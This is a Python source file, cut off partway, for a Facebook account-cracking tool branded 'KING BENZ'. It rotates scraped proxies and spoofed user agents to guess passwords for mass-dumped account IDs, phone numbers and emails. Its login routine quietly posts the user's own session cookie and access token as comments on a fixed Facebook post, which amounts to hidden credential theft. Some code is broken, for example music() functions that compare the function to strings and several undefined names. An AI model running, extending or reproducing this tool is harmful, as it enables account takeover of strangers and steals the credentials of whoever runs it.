
def music(x):
	if "shad1.mp3" == music or music == "shad.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
#music-2
def music(x):
	if "shad2.mp3" == music or music == "shad1.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
#music-2
def music(x):
	if "shad3.mp3" == music or music == "shad2.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
#music-3
def music(x):
	if "shad4.mp3" == music or music == "shad3.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
###---[ INFO AUTHOR GANS DIKIT ]---###
#----[ jangan di oprek, sayangi data hpmu ]-----#
author = 'KING BENZ'
git_hub = 'github.com/KINGBENZ'
faceb0ok = 'KING BENZ btc '
version = 'B€Ñ$ 0.0.1'
#-----------[     APPROVAL     ]--------------#

#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m' #WHITE
M = '\x1b[1;91m' #RED
H = '\x1b[1;92m' #GREEN
K = '\x1b[1;93m' #YELLOW
B = '\x1b[1;94m' #BLUE
U = '\x1b[1;95m' #MAGENTA
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m" #GRAY
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # YELLOW +
h = '\x1b[1;92m' # GREEN +
hh = '\033[32m' # GREEN -
u = '\033[95m' # MAGENTA
kk = '\033[33m' # YELLOW -
bb = '\33[1;96m' # CYAN -
p = '\x1b[0;34m' # WHITE +
G='\033[38;2;255;127;0;1m' #ORANGE

###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
hp = platform.platform()
ses = requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')

###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f"""
{K}
───────────────────────────────────────────────────────────────────────────
─██████████████───██████████████─██████──────────██████─██████████████████─
─██▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████████──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██───██▒▒██████████─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─████████████▒▒▒▒██─
─██▒▒██──██▒▒██───██▒▒██─────────██▒▒██████▒▒██──██▒▒██─────────████▒▒████─
─██▒▒██████▒▒████─██▒▒██████████─██▒▒██──██▒▒██──██▒▒██───────████▒▒████───
─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██──██▒▒██─────████▒▒████─────
─██▒▒████████▒▒██─██▒▒██████████─██▒▒██──██▒▒██──██▒▒██───████▒▒████───────
─██▒▒██────██▒▒██─██▒▒██─────────██▒▒██──██▒▒██████▒▒██─████▒▒████─────────
─██▒▒████████▒▒██─██▒▒██████████─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒████████████─
─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██████████▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─████████████████─██████████████─██████──────────██████─██████████████████─
───────────────────────────────────────────────────────────────────────────
                  {M}😍{K}💘{U}😘{M} WELCOME TO KING BENZ TOOL {U}😍{K}💘{M}😘
          {M}+{O} AUTHOR: {U}          KING BENZ 
          {K}+{G} GITHUB: {H}        KINGBENZ187
          {B}+{M} WHATSAPP: {kk}   +2347044229160
          {O}+{H} FACEBOOK: {M}  king benz btc
          {G}+{B} VERSION: {G}     B€Ñ$ 0.0.1
{M}[{B}#{K}]{G}===================================================={M}[{B}#{G}]""")





def logo2():
	return str(f"""
{K}

───────────────────────────────────────────────────────────────────────────
─██████████████───██████████████─██████──────────██████─██████████████████─
─██▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████████──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██───██▒▒██████████─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─████████████▒▒▒▒██─
─██▒▒██──██▒▒██───██▒▒██─────────██▒▒██████▒▒██──██▒▒██─────────████▒▒████─
─██▒▒██████▒▒████─██▒▒██████████─██▒▒██──██▒▒██──██▒▒██───────████▒▒████───
─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██──██▒▒██─────████▒▒████─────
─██▒▒████████▒▒██─██▒▒██████████─██▒▒██──██▒▒██──██▒▒██───████▒▒████───────
─██▒▒██────██▒▒██─██▒▒██─────────██▒▒██──██▒▒██████▒▒██─████▒▒████─────────
─██▒▒████████▒▒██─██▒▒██████████─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒████████████─
─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██████████▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─████████████████─██████████████─██████──────────██████─██████████████████─
───────────────────────────────────────────────────────────────────────────
                            {H} L {M} O {B} A {K} D {Z} I {G} N {P} G {M}.......... """)

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
warna_warni_biasa=random.choice([H,K,M,O,B,U])
garis = f" {P}[{warna_warni_biasa}•{P}]"

###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam = [], [], 
id, id2, loop ,ok , cp = [], [], 0, 0, 0
ugen=[]
ugen2=[]
redmi = []
###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	

###---[ AUTO CREATE UA & PROXY ]---###
try:
	clear_layar()
	print(logo2())
	print(f'\r\n {M} TOTAL PROXY AND USER AGENTS ')
	try:os.remove('.proxy.txt')
	except:pass 
	try:os.remove('.green.txt')
	except:pass
	A = ''
	one = ses.get('https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt').text
	for x in one.splitlines():
		if '+' in x:
			if '.' in x:
				p = x.split(' ')[0]
				A += '\n'+p
	uno = ses.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text
	open('.proxy.txt','w').write(uno)
except Exception as e:
	print(f'{M} KING BENZ')
uno = open('.proxy.txt','r').read().splitlines()

try:
	green= ses.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt').text
	open('.green.txt','w').write(green)
except Exception as e:
	print(f'{M}KING-BENZ')
green=open('.green.txt','r').read().splitlines()
  
try:agent=open(opera-mini.txt,'r').read().splitlines()
except:agent=open('opera-mini.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(6,13)
    c='SAMSUNG SM-A225M)'
    d='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0'
    e='Chrome/'
    f=random.randrange(70,108)
    g='0'
    h=random.randrange(3000,4999)
    i=random.randrange(88,199)
    j='Mobile Safari/537.36'
    uaku=f'{a} {b}; {c} {d} {e}{f}.{g}.{h}.{i} {j}'
    ugen2.append(uaku)


    aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
    b=random.randrange(4,16)
    c='_'
    d=random.randrange(4,16)
    e='like Mac OS X) AppleWebKit/'
    f=random.randrange(600,605)
    g='1'
    h='15'
    i='(KHTML, like Gecko) CriOS/'
    j=random.randrange(10,99)
    k='0'
    l='Mobile/'
    m=random.randrange(10,19)
    n=random.choice(['E', 'B', 'D', 'G', 'C', 'F'])
    o=random.randrange(100,199)
    p='Safari/'
    q=random.randrange(600,605)
    r='1'
    uaku2=f'{aa} {b}{c}{d} {e}{f}.{g}.{h} {i}{j}.{k} {l}{m}{n}{o} {p}{q}{r}'
    ugen.append(uaku2)
    
    
    aa=random.choice(['Mozilla/5.0 (Linux; Android','Mozilla/5.0 (Linux; U; Android'])
    b=random.choice(['6','7','8','9','10','11','12'])
    c=random.choice([' en-us; GT-', ' en-us; SM', ' SM-', ' id-id; SM', 'GT-', ' SAMSUNG; SAMSUNG-GT-S'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(3500,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 OPR/'
    m=random.randrange(20, 99)
    n=random.choice(['0','1'])
    o=random.randrange(2000, 3000)
    p=random.randrange(1, 9)
    q=random.randrange(1, 9)
    r=random.randrange(1, 9)
    s=random.randrange(1, 9)
    t=random.randrange(1, 9)
    u=random.randrange(1, 9)
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}{m}.{n}.{o}.{p}{q}{r}{s}{t}{u}'
    ugen.append(uaku2)
  
    
    aa='Mozilla/5.0 (iPad; CPU OS'
    b=random.randrange(4,16)
    c='_'
    d=random.randrange(1,7)
    e='_'
    f=random.randrange(4,16)
    g='like Mac OS X) AppleWebKit/'
    h=random.randrange(600,605)
    i='1'
    j=random.randrange(15,55)
    k='(KHTML, like Gecko) FxiOS/'
    l=random.randrange(7,99)
    m=random.randrange(1,9)
    n=random.choice(['e', 'b', 'd', 'g', 'c', 'f'])
    o=random.randrange(1000,3999)
    p='Mobile/'
    q=random.randrange(10,19)
    r=random.choice(['E', 'B', 'D', 'G', 'C', 'F'])
    s=random.randrange(30,39)
    t='Safari/'
    u=random.randrange(600,605)
    v='1'
    w=random.randrange(15,55)
    uaku2=f'{aa} {b}{c}{d}{e}{f} {g}{h}.{i}.{j} {k}{l}{m}{n}{o} {p}{q}{r}{s} {t}{u}.{v}.{w}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.randrange(4,12)
    c=random.choice(['en-US; vivo 1807 Build/','en-us; Redmi 5 Plus Build/','SM-N950U Build/','id-id; Redmi 10A Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(80,107)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='UCBrowser/'
    m=random.randrange(1,11)
    n='4'
    o=random.randrange(0,9)
    p=random.randrange(1000,1999)
    uaku2=f'{aa} {b}; {c}{d}{e}{f} {g}{h}.{i}.{j}.{k} {l}{m}.{n}.{o}.{p} {q}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.randrange(4,12)
    c=random.choice(['SAMSUNG SM-F900U Build/','Infinix X683 Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(80,107)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
    b=random.randrange(4,16)
    c=random.randrange(0,9)
    d='like Mac OS X) AppleWebKit/'
    e=random.randrange(500,605)
    f='1'
    g=random.randrange(10,56)
    h='(KHTML, like Gecko) OPiOS/'
    i=random.randrange(9,99)
    j=random.randrange(0,9)
    k=random.randrange(1,29)
    l=random.randrange(10000,99999)
    m='Mobile/'
    n=random.randrange(10,19)
    o=random.choice(['E', 'B', 'D', 'G', 'C', 'F'])
    p=random.randrange(100,199)
    q='Safari/'
    r=random.randrange(9000,9999)
    s=random.randrange(50,59)
    uaku2=f'{aa} {b}{c} {d}{e}.{f}.{g} {h}{i}.{j}.{k}.{l} {m}{n}{o}{p} {s}{r}.{s}'
    ugen.append(uaku2)  

for x in range(999):
	rc = random.choice
	rr = random.randint
	vz = ['8.1','6.0.1','7.0','8.1.0','4.2.2','5.1','7.1.1','8.0.0','4.3','4.4.4','9','12','10','11','2.3.5','4.4.2','11.0','10.0','5.1.1','5.0.2','7.1.2','8.0','4.3','3.2.1','4.0.4']
	lang = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	bz = ['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
	TEAM = f"Mozilla/5.0 (Linux; U; Android {str(rc(vz))}; {str(rc(lang))}; JSN-L42 Build/HONORJSN-L42) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(95,108))}.0.{str(rr(4200,4500))}.{str(rr(100,109))} UCBrowser/{str(rr(12,16))}.3.{str(rr(0,9))}.{str(rr(1000,1500))} Mobile Safari/537.36"
	F = f"{TEAM}"
	if F in redmi:pass      
	TEAM1 = f"Mozilla/5.0 (Linux; U; Android {str(rc(vz))}; {str(rc(lang))}; RMX2061 Build/QKQ1.{str(rr(191222,192233))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.{str(rr(3904,4000))}.{str(rr(108,128))} UCBrowser/13.{str(rr(1,9))}.{str(rr(0,9))}.{str(rr(1300,1499))} Mobile Safari/537.36"
	F = f"{TEAM1}"
	if F in redmi:pass      
	TEAM2 = f"Mozilla/5.0 (Linux; U; Android {str(rc(vz))}; GT-S7582 Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(0,9))}{str(rr(0,9))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 OPR/{str(rr(20,30))}.0.{str(rr(2244,2999))}.{str(rr(102356,199999))}"
	F = f"{TEAM2}"
	if F in redmi:pass     
	TEAM3 = f"Mozilla/5.0 (Linux; U; Android {str(rc(vz))}; LS1542QWN Build/SKQ1.{str(rr(210700,249870))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,107))}.0.{str(rr(1098,1989))}.{str(rr(141,151))} Mobile Safari/537.36 OPR/{str(rr(66,76))}.1.{str(rr(2244,2566))}.{str(rr(67899,68999))}"
	F = f"{TEAM3}"
	if F in redmi:pass    
	TEAM4 = f"Mozilla/5.0 (Linux; Android {str(rc(vz))}; vivo {str(rr(1910,1919))} Build/QP1A.{str(rr(190711,190777))}.020; {str(rc(lang))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(69,79))}.0.{str(rr(3497,3598))}.{str(rr(100,108))} Mobile Safari/537.36 Puffin/{str(rr(3,7))}.{str(rr(4,9))}.3.{str(rr(40913,40923))}AP"
	F = f"{TEAM4}"
	if F in redmi:pass    
	TEAM5 = f"Mozilla/5.0 (Linux; Android {str(rc(vz))}; CPH1907 Build/QKQ1.{str(rr(190915,191905))}.002; {str(rc(lang))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(69,79))}.0.{str(rr(3497,3599))}.{str(rr(100,109))} Mobile Safari/537.36 Puffin/{str(rr(7,9))}.{str(rr(4,8))}.{str(rr(1,3))}.{str(rr(40913,41923))}AP"
	F = f"{TEAM5}"
	if F in redmi:pass
    
try:abcd = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f"{hh}[•] {kk}failed to dump proxies")
print(f' {M} ✓{H} PROXIES {M}:{K} '+str(len(abcd)))
print(f'{M}  ✓{H}  USERAGENTS {M}:{B} '+str(len(agent)))
sleep(1)
	
###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:login()

	
###---[ LOGIN COOKIE ]---###
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"{hh}INPUT COOKIES: ")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'COOKIE':cookie}
	try:
		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		tem      = ('\nKeren bang @[100018396913729:] & @[100001293675274:]\n\nJangan menyerah ketika gagal,ayo semangat\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100018396913729/posts/pfbid07LqmAJJctsL8fieFE9MwCFMAYvbkXjJRBDKnuPxd4WWwdmseGGZXGKVnCb6G9DAbl/?app=fbl')
		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
		#ses.post(f"https://graph.facebook.com/1110025212954032?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/1110025212954032/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1110025212954032/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1110025212954032/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
		open('.cookie.txt','w').write(cookie)
		print(f'{K}[{H}*{B}] {H}LOGIN SUCCESSFUL.........RERUN COMMAND!!!!');time.sleep(1)
		open('.token.txt','w').write(token)
	except Exception as e:exit(f"{H}  {M}cookie invalid")







def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
	
###---[ APPROVAL ]---###
def make(): 

  uuid = str(os.geteuid()) + str(os.getlogin()) 

  id = "|".join(uuid) 

  print("\x1b[1;93m #$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$ ")

  print("\x1b[1;91m  YOUR ID : "+id) 

  print ("\x1b[1;93m #$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$")

  try: 

    httpCaht = requests.get("https://raw.githubusercontent.com/KINGBENZ/approvel-/main/Paid.txt").text 

    if id in httpCaht: 

      print("\x1b[1;97m [\033[1;92m•\x1b[1;97m]\033[1;97m  YOUR KEY 🗝️ IS APPROVED \033[97m") 

      msg = str(os.geteuid()) 

      time.sleep(1) 

      pass 

    else: 

      print("\x1b[1;91m YOUR KEY IS NOT APPROVED INBOX ME ON WHATSAPP \033[97m") 

      os.system('xdg-open https://wa.me/+2347044229160')

      time.sleep(1) 

      sys.exit() 

  except: 

    sys.exit() 

    if name == '__main__': 

     print (logo)

     make() 

    

make()






os.system('clear')
###---[ MENU UTAMS ]---###
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f"{M}1{K} CLONE SINGLE-ID  {K}7 CLONE NAME SEARCH")
	print(f"{K}2{G} CLONE MULTI-ID   {H}8 CLONE FROM FILE")
	print(f"{O}3{O} CLONE FOLLOWERS  {B}9 CLONE CRACK RESULT")
	print(f"{H}4{H} CLONE COMMENT    {M}10 SAVE CRACKED ACCOUNT")
	print(f"{P}5{M} CLONE GROUP      {H}11 CHECK OPTION ACCOUNT")
	print(f"{K}6{B} CLONE EMAIL      {K}12 LOGOUT  COOKIES")

	ask = input(f'[{hh}*{U}] {M} OPTION :{H} ')
	print('')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:clon_email()
	elif ask in ['7','07']:crack_search()
	elif ask in ['8','08']:crack_file()
	elif ask in ['9','09']:cek_hasil()
	elif ask in ['10']:cek_akun()
	elif ask in ['11']:cek_opsi_cp()
	elif ask in ['12']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f"{mm}[{mm}•{mm}] {M}choose correct content")
	else:sys.exit(f"{mm}[{mm}•{mm}] {M}choose correct content")


	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	print('=================================================')
	try:ok = os.listdir('CP')
	except:sys.exit(f"{kk}[•] no cp result")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f'{h}[{no}] - {kk}{len(jum)} {hh}account')	
	exc = input(f'{bb}[•] number to check\n[•] number : ')
	file = nom[int(exc)-1]
	print('{G}===============================================')
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = random.choice(redmi)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r [•] checkpoint option check has completed')
	


###---[ CEK AKUN AMAN ]---###
def cek_akun():
	sesi , nga = 0 , 0
	no,nom = 0,[]
	print('{G}=======================================================')
	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}
	except:print(f' [{M}#{M}/ cookie invalid');exit()
	try:ok = os.listdir('OK')
	except:sys.exit(f"{bb}[•] no ok result")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f'{U}[{no}] - {bb}{len(jum)} {bb}accounts')	
	exc = input(f'{U}[•] file number to save\n[•] file : ')
	xxx = input(' save the account to what file : \n[•] input  file name : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(f'{G}=============================================')
	print(f'{hh}the account is saved in : {nonon}\n account stored    : SDCARD')
	print(f'{G}===================================≠≠≠≠≠≠≠≠≠≠')
	try:
		uuid = open('OK/'+file,'r').read().splitlines()
		mek = 0
		for data in uuid:
			print(f'\r{hh}[•] safe : {nga} down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] pemisah salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r [{hh}{mek}{P}] {user}|{nama}                    ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r [{M}{mek}{P}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f" [{M}>{P}] file tidak ada")
		
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f'{U}[{H}1{U}]{H} CHECK OK RESULTS\n{U}[{H}2{U}] {kk}CHECK CP RESULTS\n[•] Choose : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f"[•]{kk} CHOOSE CORRECT OPTION")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f'{hh}[{hh}{no}{hh}] {hh} - {hh}{len(jum)} {hh}accounts')	
		abc = input(f'{hh}[{hh}•{hh}] File Number : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f"{hh}[{M}••{hh}] no OK file")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f"{hh}[{M}•{hh}]{k} no cp result")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f'{U}[{kk}{no}{U}] {hh} - {kk}{len(jum)} {hh}accounts')		
		abc = input(f'{U}[{H}•{U}] file number : ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f"{U}[{H}•{U}] {M}no CP result")
		print(kk+buka+P)
	else:sys.exit(f"{O}#{B}•{M}# {k}choose correct content")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f' [{hh}<{P}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}>{P}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		print('\r DUMPING IDS... %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()
		

def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{mm}>{P}] dump dari email, max 1000 id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] masukan 1 nama saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] masukan domain yang benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f'{mm}[{mm}•{mm}] Enter File Path\n{mm}[{mm}•{mm}] File path : {mm}')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f"{U}[{H}>{U}]{M} INCORRECT")
			dump.append(data)
			print('\r{U}[{H}•{U}] Dumping IDs %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f"{H}[•] {M}file doesn't exist")
	print(f'\r{mm}[{mm}•{mm}] The Total Number Of Accounts Is {mm}{len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
